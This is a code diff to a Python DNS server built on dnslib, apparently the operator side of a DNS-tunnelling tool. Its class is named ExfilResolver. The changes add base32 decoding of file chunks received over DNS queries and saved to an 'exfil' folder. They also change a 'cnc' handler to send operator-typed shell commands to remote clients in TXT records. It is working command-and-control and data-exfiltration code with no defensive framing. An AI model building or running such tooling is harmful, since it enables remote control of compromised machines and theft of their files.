@@ -6,6 +6,7 @@ from dnslib.label import DNSLabel
 from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger
 
 import os
+import base64
 
 class ExfilResolver(BaseResolver):
     def __init__(self,origin,ttl):
@@ -14,10 +15,12 @@ class ExfilResolver(BaseResolver):
         self.routes = {}
         self.keys = [""]
         self.files = dict()
+        self.cmd = "true"
 
     def resolve(self,request,handler):
         reply = request.reply()
         qname = str(request.q.qname)
+        qname = qname.lower()
 
         # Strip the top level domains off to just handle the part relevant to us
         qname = qname.replace("." + str(self.origin), "") 
@@ -82,10 +85,9 @@ class ExfilResolver(BaseResolver):
     # unimplemented
     def cnc(self, request, qname):
         reply = request.reply()
+        
+        reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(self.cmd)))
 
-
-
-        reply.header.rcode = RCODE.NXDOMAIN
         return reply
 
 
@@ -145,9 +147,8 @@ class ExfilResolver(BaseResolver):
             print("File:", filename, "100 % complete")
             with open("./exfil/" + filename, "w") as f:
                 for x in self.files[filename]: 
-                    f.write(x.replace("1", "="))
+                    f.write(base64.b32decode(x.replace("1", "="), casefold=True))
             print("File:", filename, "written to disk")
-            # TODO decode the file
             del self.files[filename]
             self.keys += [filename]
         else:
@@ -176,5 +177,5 @@ if __name__ == '__main__':
 
     print("Started dns server")
     # TODO write some interactive shit here for c2
-    while udp_server.isAlive():
-        time.sleep(1)
+    while udp_server.isAlive(): 
+        resolve.cmd = raw_input("Shell Command: ")
